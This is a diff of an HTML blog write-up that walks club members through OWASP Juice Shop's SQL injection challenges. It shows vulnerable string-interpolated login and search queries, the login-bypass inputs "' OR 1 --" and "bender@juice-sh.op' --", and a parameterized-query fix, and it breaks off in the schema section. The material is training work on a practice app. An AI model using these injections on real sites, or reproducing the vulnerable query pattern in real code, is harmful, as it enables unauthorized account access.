@@ -66,36 +66,57 @@
 <summary id="table-of-contents-header"> Table of Contents </summary>
 
 <ul>
-<li><a href="#solutions">Solutions</a>
+<li><a href="#solutions" id="toc-solutions">Solutions</a>
 <ul>
-<li><a href="#login-admin">Login Admin</a></li>
-<li><a href="#login-bender">Login Bender</a></li>
-<li><a href="#login-jim">Login Jim</a></li>
-<li><a href="#admin-section">Admin Section</a></li>
-<li><a href="#five-star-feedback">Five-Star Feedback</a></li>
-<li><a href="#database-schema">Database Schema</a>
+<li><a href="#login-admin" id="toc-login-admin">Login Admin</a></li>
+<li><a href="#login-bender" id="toc-login-bender">Login Bender</a></li>
+<li><a href="#login-jim" id="toc-login-jim">Login Jim</a></li>
+<li><a href="#admin-section" id="toc-admin-section">Admin
+Section</a></li>
+<li><a href="#five-star-feedback" id="toc-five-star-feedback">Five-Star
+Feedback</a></li>
+<li><a href="#database-schema" id="toc-database-schema">Database
+Schema</a>
 <ul>
-<li><a href="#theory">Theory</a></li>
-<li><a href="#execution">Execution</a></li>
+<li><a href="#theory" id="toc-theory">Theory</a></li>
+<li><a href="#execution" id="toc-execution">Execution</a></li>
 </ul></li>
 </ul></li>
 </ul>
 
 </details>
 
-<p>This writeup is to help <a href="https://www.nku.edu/academics/informatics/beyond/student-organizations/nkcyber.html">NKCyber</a> Club Members walk through the steps for the first few solutions to the SQL Injection section of <a href="https://owasp.org/www-project-juice-shop/">OWASP Juice Shop</a>. Similar articles include <a href="https://zack.fyi/blog/juice-shop.html">instructions for administering OWASP’s Juice Shop</a>, the <a href="https://zack.fyi/blog/juice-shop-data-exposure.html">Sensitive Data Exposure solutions</a>, and the <a href="https://zack.fyi/blog/juice-shop-answers.html">XSS solutions</a>.</p>
+<p>This writeup is to help <a
+href="https://www.nku.edu/academics/informatics/beyond/student-organizations/nkcyber.html">NKCyber</a>
+Club Members walk through the steps for the first few solutions to the
+SQL Injection section of <a
+href="https://owasp.org/www-project-juice-shop/">OWASP Juice Shop</a>.
+Similar articles include <a
+href="https://zack.fyi/blog/juice-shop.html">instructions for
+administering OWASP’s Juice Shop</a>, the <a
+href="https://zack.fyi/blog/juice-shop-data-exposure.html">Sensitive
+Data Exposure solutions</a>, and the <a
+href="https://zack.fyi/blog/juice-shop-answers.html">XSS
+solutions</a>.</p>
 <h1 id="solutions">Solutions</h1>
 <h2 id="login-admin">Login Admin</h2>
 <p>Let’s take a look at the login page:</p>
 <figure>
-<img src="../assets/juice-shop/injection/image-20231010210021936.png" alt="The Login Page" /><figcaption aria-hidden="true">The Login Page</figcaption>
+<img src="../assets/juice-shop/injection/image-20231010210021936.png"
+alt="The Login Page" />
+<figcaption aria-hidden="true">The Login Page</figcaption>
 </figure>
-<p>Looking at the Network tab in our developer tools, I wonder what is being sent to the server when we input our email and password.</p>
+<p>Looking at the Network tab in our developer tools, I wonder what is
+being sent to the server when we input our email and password.</p>
 <figure>
-<img src="../assets/juice-shop/injection/image-20231010210211780.png" alt="We see our email and password sent to the server." /><figcaption aria-hidden="true">We see our email and password sent to the server.</figcaption>
+<img src="../assets/juice-shop/injection/image-20231010210211780.png"
+alt="We see our email and password sent to the server." />
+<figcaption aria-hidden="true">We see our email and password sent to the
+server.</figcaption>
 </figure>
 <p>Cool. So, how are the email and password handled in the server?</p>
-<p>Let’s take a look at the code snippet for this challenge (<em>slightly</em> modified from the original):</p>
+<p>Let’s take a look at the code snippet for this challenge
+(<em>slightly</em> modified from the original):</p>
 <details>
 <summary>
 View full code
@@ -110,19 +131,19 @@ View full code
 <span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>    <span class="fu">verifyPostLoginChallenges</span>(user)<span class="op">;</span> <span class="co">// vuln-code-snippet hide-line</span></span>
 <span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>    BasketModel<span class="op">.</span><span class="fu">findOrCreate</span>({ where<span class="op">:</span> { UserId<span class="op">:</span> user<span class="op">.</span><span class="at">data</span><span class="op">.</span><span class="at">id</span> } })</span>
 <span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">then</span>(([basket]<span class="op">:</span> [BasketModel<span class="op">,</span> <span class="dt">boolean</span>]) <span class="kw">=&gt;</span> {</span>
-<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>        const token <span class="op">=</span> security<span class="op">.</span><span class="fu">authorize</span>(user)<span class="op">;</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>        <span class="kw">const</span> token <span class="op">=</span> security<span class="op">.</span><span class="fu">authorize</span>(user)<span class="op">;</span></span>
 <span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>        user<span class="op">.</span><span class="at">bid</span> <span class="op">=</span> basket<span class="op">.</span><span class="at">id</span><span class="op">;</span> <span class="co">// keep track of original basket</span></span>
 <span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>        security<span class="op">.</span><span class="at">authenticatedUsers</span><span class="op">.</span><span class="fu">put</span>(token<span class="op">,</span> user)<span class="op">;</span></span>
 <span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>        res<span class="op">.</span><span class="fu">json</span>({</span>
 <span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a>          authentication<span class="op">:</span> { token<span class="op">,</span> bid<span class="op">:</span> basket<span class="op">.</span><span class="at">id</span><span class="op">,</span> umail<span class="op">:</span> user<span class="op">.</span><span class="at">data</span><span class="op">.</span><span class="at">email</span> }<span class="op">,</span></span>
 <span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a>        })<span class="op">;</span></span>
 <span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a>      })</span>
-<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">catch</span>((error<span class="op">:</span> Error) <span class="kw">=&gt;</span> {</span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">catch</span>((error<span class="op">:</span> <span class="bu">Error</span>) <span class="kw">=&gt;</span> {</span>
 <span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a>        <span class="fu">next</span>(error)<span class="op">;</span></span>
 <span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a>      })<span class="op">;</span></span>
 <span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a>  }</span>
 <span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a>  <span class="fu">return</span> (req<span class="op">:</span> Request<span class="op">,</span> res<span class="op">:</span> Response<span class="op">,</span> next<span class="op">:</span> NextFunction) <span class="kw">=&gt;</span> {</span>
+<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> (req<span class="op">:</span> Request<span class="op">,</span> res<span class="op">:</span> Response<span class="op">,</span> next<span class="op">:</span> NextFunction) <span class="kw">=&gt;</span> {</span>
 <span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a>    models<span class="op">.</span><span class="at">sequelize</span></span>
 <span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">query</span>(</span>
 <span id="cb1-26"><a href="#cb1-26" aria-hidden="true" tabindex="-1"></a>        <span class="co">// </span><span class="al">TODO</span><span class="co">: using string interpolation with SQL can&#39;t be *too* bad for security, right?</span></span>
@@ -131,11 +152,11 @@ View full code
 <span id="cb1-29"><a href="#cb1-29" aria-hidden="true" tabindex="-1"></a>        <span class="sc">}</span><span class="vs">&#39; AND password = &#39;</span><span class="sc">${</span>security<span class="op">.</span><span class="fu">hash</span>(</span>
 <span id="cb1-30"><a href="#cb1-30" aria-hidden="true" tabindex="-1"></a>          req<span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="at">password</span> <span class="op">||</span> <span class="st">&quot;&quot;</span></span>
 <span id="cb1-31"><a href="#cb1-31" aria-hidden="true" tabindex="-1"></a>        )<span class="sc">}</span><span class="vs">&#39; AND deletedAt IS NULL`</span><span class="op">,</span></span>
-<span id="cb1-32"><a href="#cb1-32" aria-hidden="true" tabindex="-1"></a>        { model<span class="op">:</span> UserModel<span class="op">,</span> plain<span class="op">:</span> true }</span>
+<span id="cb1-32"><a href="#cb1-32" aria-hidden="true" tabindex="-1"></a>        { model<span class="op">:</span> UserModel<span class="op">,</span> plain<span class="op">:</span> <span class="kw">true</span> }</span>
 <span id="cb1-33"><a href="#cb1-33" aria-hidden="true" tabindex="-1"></a>      )</span>
 <span id="cb1-34"><a href="#cb1-34" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">then</span>((authenticatedUser<span class="op">:</span> { data<span class="op">:</span> User }) <span class="kw">=&gt;</span> {</span>
-<span id="cb1-35"><a href="#cb1-35" aria-hidden="true" tabindex="-1"></a>        const user <span class="op">=</span> utils<span class="op">.</span><span class="fu">queryResultToJson</span>(authenticatedUser)<span class="op">;</span></span>
-<span id="cb1-36"><a href="#cb1-36" aria-hidden="true" tabindex="-1"></a>        <span class="fu">if</span> (user<span class="op">.</span><span class="at">data</span><span class="op">?.</span><span class="at">id</span> <span class="op">&amp;&amp;</span> user<span class="op">.</span><span class="at">data</span><span class="op">.</span><span class="at">totpSecret</span> <span class="op">!==</span> <span class="st">&quot;&quot;</span>) {</span>
+<span id="cb1-35"><a href="#cb1-35" aria-hidden="true" tabindex="-1"></a>        <span class="kw">const</span> user <span class="op">=</span> utils<span class="op">.</span><span class="fu">queryResultToJson</span>(authenticatedUser)<span class="op">;</span></span>
+<span id="cb1-36"><a href="#cb1-36" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (user<span class="op">.</span><span class="at">data</span><span class="op">?.</span><span class="at">id</span> <span class="op">&amp;&amp;</span> user<span class="op">.</span><span class="at">data</span><span class="op">.</span><span class="at">totpSecret</span> <span class="op">!==</span> <span class="st">&quot;&quot;</span>) {</span>
 <span id="cb1-37"><a href="#cb1-37" aria-hidden="true" tabindex="-1"></a>          res<span class="op">.</span><span class="fu">status</span>(<span class="dv">401</span>)<span class="op">.</span><span class="fu">json</span>({</span>
 <span id="cb1-38"><a href="#cb1-38" aria-hidden="true" tabindex="-1"></a>            status<span class="op">:</span> <span class="st">&quot;totp_token_required&quot;</span><span class="op">,</span></span>
 <span id="cb1-39"><a href="#cb1-39" aria-hidden="true" tabindex="-1"></a>            data<span class="op">:</span> {</span>
@@ -145,13 +166,13 @@ View full code
 <span id="cb1-43"><a href="#cb1-43" aria-hidden="true" tabindex="-1"></a>              })<span class="op">,</span></span>
 <span id="cb1-44"><a href="#cb1-44" aria-hidden="true" tabindex="-1"></a>            }<span class="op">,</span></span>
 <span id="cb1-45"><a href="#cb1-45" aria-hidden="true" tabindex="-1"></a>          })<span class="op">;</span></span>
-<span id="cb1-46"><a href="#cb1-46" aria-hidden="true" tabindex="-1"></a>        } else <span class="fu">if</span> (user<span class="op">.</span><span class="at">data</span><span class="op">?.</span><span class="at">id</span>) {</span>
+<span id="cb1-46"><a href="#cb1-46" aria-hidden="true" tabindex="-1"></a>        } <span class="cf">else</span> <span class="cf">if</span> (user<span class="op">.</span><span class="at">data</span><span class="op">?.</span><span class="at">id</span>) {</span>
 <span id="cb1-47"><a href="#cb1-47" aria-hidden="true" tabindex="-1"></a>          <span class="fu">afterLogin</span>(user<span class="op">,</span> res<span class="op">,</span> next)<span class="op">;</span></span>
-<span id="cb1-48"><a href="#cb1-48" aria-hidden="true" tabindex="-1"></a>        } else {</span>
+<span id="cb1-48"><a href="#cb1-48" aria-hidden="true" tabindex="-1"></a>        } <span class="cf">else</span> {</span>
 <span id="cb1-49"><a href="#cb1-49" aria-hidden="true" tabindex="-1"></a>          res<span class="op">.</span><span class="fu">status</span>(<span class="dv">401</span>)<span class="op">.</span><span class="fu">send</span>(res<span class="op">.</span><span class="fu">__</span>(<span class="st">&quot;Invalid email or password.&quot;</span>))<span class="op">;</span></span>
 <span id="cb1-50"><a href="#cb1-50" aria-hidden="true" tabindex="-1"></a>        }</span>
 <span id="cb1-51"><a href="#cb1-51" aria-hidden="true" tabindex="-1"></a>      })</span>
-<span id="cb1-52"><a href="#cb1-52" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">catch</span>((error<span class="op">:</span> Error) <span class="kw">=&gt;</span> {</span>
+<span id="cb1-52"><a href="#cb1-52" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">catch</span>((error<span class="op">:</span> <span class="bu">Error</span>) <span class="kw">=&gt;</span> {</span>
 <span id="cb1-53"><a href="#cb1-53" aria-hidden="true" tabindex="-1"></a>        <span class="fu">next</span>(error)<span class="op">;</span></span>
 <span id="cb1-54"><a href="#cb1-54" aria-hidden="true" tabindex="-1"></a>      })<span class="op">;</span></span>
 <span id="cb1-55"><a href="#cb1-55" aria-hidden="true" tabindex="-1"></a>  }<span class="op">;</span></span>
@@ -165,24 +186,41 @@ View full code
 <span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>        <span class="sc">}</span><span class="vs">&#39; AND password = &#39;</span><span class="sc">${</span>security<span class="op">.</span><span class="fu">hash</span>(</span>
 <span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>          req<span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="at">password</span> <span class="op">||</span> <span class="st">&quot;&quot;</span></span>
 <span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>        )<span class="sc">}</span><span class="vs">&#39; AND deletedAt IS NULL`</span><span class="op">,</span></span>
-<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>        { model<span class="op">:</span> UserModel<span class="op">,</span> plain<span class="op">:</span> true }</span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>        { model<span class="op">:</span> UserModel<span class="op">,</span> plain<span class="op">:</span> <span class="kw">true</span> }</span>
 <span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>      )</span></code></pre></div>
-<p>We’re using string interpolation with a raw SQL query. That means anything that we enter has the potential to become part of the SQL query.</p>
-<p>When we entered <code>email</code> and <code>password</code>, this is the query the database received (where the password hash is some secure hash):</p>
+<p>We’re using string interpolation with a raw SQL query. That means
+anything that we enter has the potential to become part of the SQL
+query.</p>
+<p>When we entered <code>email</code> and <code>password</code>, this is
+the query the database received (where the password hash is some secure
+hash):</p>
 <p><code>SELECT * FROM Users WHERE email = 'email' AND password = 'THE PASSWORD HASH' AND deletedAt IS NULL</code></p>
-<p>Unfortunately, no users are found with that email and password. However, it’d be great if there was a way to manipulate this query to find a user for us to log in with.</p>
+<p>Unfortunately, no users are found with that email and password.
+However, it’d be great if there was a way to manipulate this query to
+find a user for us to log in with.</p>
 <p>If we change were to execute a query like</p>
-<div class="sourceCode" id="cb3"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Users <span class="kw">WHERE</span> email <span class="op">=</span> <span class="st">&#39;email&#39;</span> <span class="kw">OR</span> <span class="dv">1</span></span></code></pre></div>
-<p>then, we’d find all the users in the table, because <code>1</code> would evaluate to <code>TRUE</code>.</p>
-<p>However, we have to do something about all the text at the end of the line. So, we can comment it out with <code>--</code>.</p>
-<div class="sourceCode" id="cb4"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Users <span class="kw">WHERE</span> email <span class="op">=</span> <span class="st">&#39;&#39;</span> <span class="kw">OR</span> <span class="dv">1</span> <span class="co">-- AND password = &#39;THE PASSWORD HASH&#39; AND deletedAt IS NULL</span></span></code></pre></div>
-<p>So, if we were to enter <code>' OR 1 --</code> into the login box, then it will find all the users in the database, and the first one will be the admin user.</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode sql"><code class="sourceCode sql"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Users <span class="kw">WHERE</span> email <span class="op">=</span> <span class="st">&#39;email&#39;</span> <span class="kw">OR</span> <span class="dv">1</span></span></code></pre></div>
+<p>then, we’d find all the users in the table, because <code>1</code>
+would evaluate to <code>TRUE</code>.</p>
+<p>However, we have to do something about all the text at the end of the
+line. So, we can comment it out with <code>--</code>.</p>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode sql"><code class="sourceCode sql"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Users <span class="kw">WHERE</span> email <span class="op">=</span> <span class="st">&#39;&#39;</span> <span class="kw">OR</span> <span class="dv">1</span> <span class="co">-- AND password = &#39;THE PASSWORD HASH&#39; AND deletedAt IS NULL</span></span></code></pre></div>
+<p>So, if we were to enter <code>' OR 1 --</code> into the login box,
+then it will find all the users in the database, and the first one will
+be the admin user.</p>
 <p>We should see the admin user account now, as well as the flag:</p>
 <figure>
-<img src="../assets/juice-shop/injection/image-20231010211205639.png" alt="successfully logged in as the admin" /><figcaption aria-hidden="true">successfully logged in as the admin</figcaption>
+<img src="../assets/juice-shop/injection/image-20231010211205639.png"
+alt="successfully logged in as the admin" />
+<figcaption aria-hidden="true">successfully logged in as the
+admin</figcaption>
 </figure>
-<p>To resolve this vulnerability, the user must not be able to directly manipulate the query sent to the database.</p>
-<p>In general, the way to address this is to escape all user inputs, so that they can only be processed as data, and never as commands.</p>
+<p>To resolve this vulnerability, the user must not be able to directly
+manipulate the query sent to the database.</p>
+<p>In general, the way to address this is to escape all user inputs, so
+that they can only be processed as data, and never as commands.</p>
 <div class="sourceCode" id="cb5"><pre class="sourceCode ts"><code class="sourceCode typescript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co">// change this:</span></span>
 <span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>models<span class="op">.</span><span class="at">sequelize</span></span>
 <span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">query</span>(</span>
@@ -191,7 +229,7 @@ View full code
 <span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>        <span class="sc">}</span><span class="vs">&#39; AND password = &#39;</span><span class="sc">${</span>security<span class="op">.</span><span class="fu">hash</span>(</span>
 <span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>          req<span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="at">password</span> <span class="op">||</span> <span class="st">&quot;&quot;</span></span>
 <span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>        )<span class="sc">}</span><span class="vs">&#39; AND deletedAt IS NULL`</span><span class="op">,</span></span>
-<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>        { model<span class="op">:</span> UserModel<span class="op">,</span> plain<span class="op">:</span> true }</span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>        { model<span class="op">:</span> UserModel<span class="op">,</span> plain<span class="op">:</span> <span class="kw">true</span> }</span>
 <span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>      )</span>
 <span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="co">// to something like this:</span></span>
 <span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>models<span class="op">.</span><span class="at">sequelize</span></span>
@@ -202,42 +240,55 @@ View full code
 <span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>            email<span class="op">:</span> req<span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="at">email</span> <span class="op">||</span> <span class="st">&quot;&quot;</span><span class="op">,</span></span>
 <span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>            hash<span class="op">:</span> security<span class="op">.</span><span class="fu">hash</span>(req<span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="at">password</span> <span class="op">||</span> <span class="st">&quot;&quot;</span>)</span>
 <span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>          }<span class="op">,</span></span>
-<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a>          model<span class="op">:</span> UserModel<span class="op">,</span> plain<span class="op">:</span> true</span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a>          model<span class="op">:</span> UserModel<span class="op">,</span> plain<span class="op">:</span> <span class="kw">true</span></span>
 <span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>        }</span>
 <span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a>      )</span></code></pre></div>
 <h2 id="login-bender">Login Bender</h2>
 <blockquote>
 <p>Log in with Bender’s user account. (Difficulty Level: 3)</p>
 </blockquote>
-<p>Login Admin worked because the admin was the first user in the database. Now we have to adjust our strategy to work with the user Bender (email: <code>bender@juice-sh.op</code>)</p>
+<p>Login Admin worked because the admin was the first user in the
+database. Now we have to adjust our strategy to work with the user
+Bender (email: <code>bender@juice-sh.op</code>)</p>
 <p>Let’s look at the query we used last time.</p>
-<div class="sourceCode" id="cb6"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Users <span class="kw">WHERE</span> email <span class="op">=</span> <span class="st">&#39;&#39;</span> <span class="kw">OR</span> <span class="dv">1</span> <span class="co">-- AND password = &#39;THE PASSWORD HASH&#39; AND deletedAt IS NULL</span></span></code></pre></div>
-<p>Is there anything here that we can change to make sure it finds the user with the email <code>bender@juice-sh.op</code>.</p>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode sql"><code class="sourceCode sql"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Users <span class="kw">WHERE</span> email <span class="op">=</span> <span class="st">&#39;&#39;</span> <span class="kw">OR</span> <span class="dv">1</span> <span class="co">-- AND password = &#39;THE PASSWORD HASH&#39; AND deletedAt IS NULL</span></span></code></pre></div>
+<p>Is there anything here that we can change to make sure it finds the
+user with the email <code>bender@juice-sh.op</code>.</p>
 <p>Let’s try something like:</p>
-<div class="sourceCode" id="cb7"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Users <span class="kw">WHERE</span> email <span class="op">=</span> <span class="st">&#39;bender@juice-sh.op&#39;</span> <span class="co">-- AND password = &#39;THE PASSWORD HASH&#39; AND deletedAt IS NULL</span></span></code></pre></div>
-<p>meaning we need to input <code>bender@juice-sh.op' --</code> into the login box.</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode sql"><code class="sourceCode sql"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Users <span class="kw">WHERE</span> email <span class="op">=</span> <span class="st">&#39;bender@juice-sh.op&#39;</span> <span class="co">-- AND password = &#39;THE PASSWORD HASH&#39; AND deletedAt IS NULL</span></span></code></pre></div>
+<p>meaning we need to input <code>bender@juice-sh.op' --</code> into the
+login box.</p>
 <p>Then, we get the flag! Success!</p>
 <h2 id="login-jim">Login Jim</h2>
 <blockquote>
 <p>Log in with Jim’s user account. (Difficulty Level: 3)</p>
 </blockquote>
-<p>Let’s try the same thing with the email <code>jim@juice-sh.op</code> instead:</p>
-<div class="sourceCode" id="cb8"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Users <span class="kw">WHERE</span> email <span class="op">=</span> <span class="st">&#39;jim@juice-sh.op&#39;</span> <span class="co">-- AND password = &#39;THE PASSWORD HASH&#39; AND deletedAt IS NULL</span></span></code></pre></div>
-<p>Where we need to enter: <code>jim@juice-sh.op' --</code> in the login box. The password doesn’t matter.</p>
+<p>Let’s try the same thing with the email <code>jim@juice-sh.op</code>
+instead:</p>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode sql"><code class="sourceCode sql"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Users <span class="kw">WHERE</span> email <span class="op">=</span> <span class="st">&#39;jim@juice-sh.op&#39;</span> <span class="co">-- AND password = &#39;THE PASSWORD HASH&#39; AND deletedAt IS NULL</span></span></code></pre></div>
+<p>Where we need to enter: <code>jim@juice-sh.op' --</code> in the login
+box. The password doesn’t matter.</p>
 <p>Yup, it’s that easy.</p>
 <h2 id="admin-section">Admin Section</h2>
 <blockquote>
-<p>Access the administration section of the store. (Difficulty Level: 2)</p>
+<p>Access the administration section of the store. (Difficulty Level:
+2)</p>
 </blockquote>
-<p>After using <code>' OR 1 --</code> to login as the administrator, you can head to <code>/administration</code> to get your flag.</p>
+<p>After using <code>' OR 1 --</code> to login as the administrator, you
+can head to <code>/administration</code> to get your flag.</p>
 <h2 id="five-star-feedback">Five-Star Feedback</h2>
 <blockquote>
 <p>Get rid of all 5-star customer feedback. (Difficulty Level: 2)</p>
 </blockquote>
-<p>From the <code>/administration</code> page, delete the one 5 star rating to get your flag.</p>
+<p>From the <code>/administration</code> page, delete the one 5 star
+rating to get your flag.</p>
 <h2 id="database-schema">Database Schema</h2>
 <blockquote>
-<p>Exfiltrate the entire DB schema definition via SQL Injection. (Difficulty Level: 3)</p>
+<p>Exfiltrate the entire DB schema definition via SQL Injection.
+(Difficulty Level: 3)</p>
 <p>This injection uses the search bar.</p>
 </blockquote>
 <h3 id="theory">Theory</h3>
@@ -247,8 +298,8 @@ View full code
 View full code
 </summary>
 <div class="sourceCode" id="cb9"><pre class="sourceCode ts"><code class="sourceCode typescript"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>module<span class="op">.</span><span class="at">exports</span> <span class="op">=</span> <span class="kw">function</span> <span class="fu">searchProducts</span>() {</span>
-<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>  <span class="fu">return</span> (req<span class="op">:</span> Request<span class="op">,</span> res<span class="op">:</span> Response<span class="op">,</span> next<span class="op">:</span> NextFunction) <span class="kw">=&gt;</span> {</span>
-<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>    let criteria<span class="op">:</span> <span class="dt">any</span> <span class="op">=</span> req<span class="op">.</span><span class="at">query</span><span class="op">.</span><span class="at">q</span> <span class="op">===</span> <span class="st">&quot;undefined&quot;</span> <span class="op">?</span> <span class="st">&quot;&quot;</span> <span class="op">:</span> req<span class="op">.</span><span class="at">query</span><span class="op">.</span><span class="at">q</span> <span class="op">??</span> <span class="st">&quot;&quot;</span><span class="op">;</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> (req<span class="op">:</span> Request<span class="op">,</span> res<span class="op">:</span> Response<span class="op">,</span> next<span class="op">:</span> NextFunction) <span class="kw">=&gt;</span> {</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> criteria<span class="op">:</span> <span class="dt">any</span> <span class="op">=</span> req<span class="op">.</span><span class="at">query</span><span class="op">.</span><span class="at">q</span> <span class="op">===</span> <span class="st">&quot;undefined&quot;</span> <span class="op">?</span> <span class="st">&quot;&quot;</span> <span class="op">:</span> req<span class="op">.</span><span class="at">query</span><span class="op">.</span><span class="at">q</span> <span class="op">??</span> <span class="st">&quot;&quot;</span><span class="op">;</span></span>
 <span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>    criteria <span class="op">=</span> criteria<span class="op">.</span><span class="at">length</span> <span class="op">&lt;=</span> <span class="dv">200</span> <span class="op">?</span> criteria <span class="op">:</span> criteria<span class="op">.</span><span class="fu">substring</span>(<span class="dv">0</span><span class="op">,</span> <span class="dv">200</span>)<span class="op">;</span></span>
 <span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>    models<span class="op">.</span><span class="at">sequelize</span></span>
 <span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">query</span>(</span>
@@ -256,8 +307,8 @@ View full code
 <span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a>        <span class="vs">`SELECT * FROM Products WHERE ((name LIKE &#39;%</span><span class="sc">${</span>criteria<span class="sc">}</span><span class="vs">%&#39; OR description LIKE &#39;%</span><span class="sc">${</span>criteria<span class="sc">}</span><span class="vs">%&#39;) AND deletedAt IS NULL) ORDER BY name`</span></span>
 <span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a>      )</span>
